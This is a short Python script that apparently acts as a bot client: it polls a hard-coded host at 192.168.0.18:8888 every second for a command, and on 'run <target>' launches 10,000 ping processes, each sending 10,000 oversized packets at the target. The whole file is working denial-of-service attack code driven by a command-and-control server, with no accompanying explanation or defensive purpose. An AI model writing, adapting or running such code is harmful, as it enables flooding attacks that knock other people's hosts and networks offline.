import subprocess, requests, time
def get():
	link = "http://192.168.0.18:8888/"
	f = requests.get(link)
	return f.text
while True:
	result = get().split(" ")

	if result[0]=="run":
		for i in range(10000):
			subprocess.Popen(["ping", f"{result[1]}", "-c", "10000", "-s", "2137"])

	time.sleep(1)
